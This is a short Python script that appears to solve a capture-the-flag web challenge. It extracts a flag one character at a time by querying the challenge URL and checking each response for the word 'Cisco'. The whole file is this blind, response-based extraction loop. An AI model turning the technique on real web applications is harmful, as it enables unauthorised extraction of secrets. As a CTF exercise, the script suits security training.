import requests
import string

string = string.letters + string.digits + "}$!@_"

url = "http://weblab02.matesctf.org/web100_58db014efa93c974f03c9513cef82327/?q=matesctf{s"
flag = "matesctf{s"
while True:
	if "}" in url:
		break
	else:
		
		for i in string:
			html = requests.get(url+i).content
			if "Cisco" in html:
				url = url+i
				flag += i
				print flag
				break
print flag
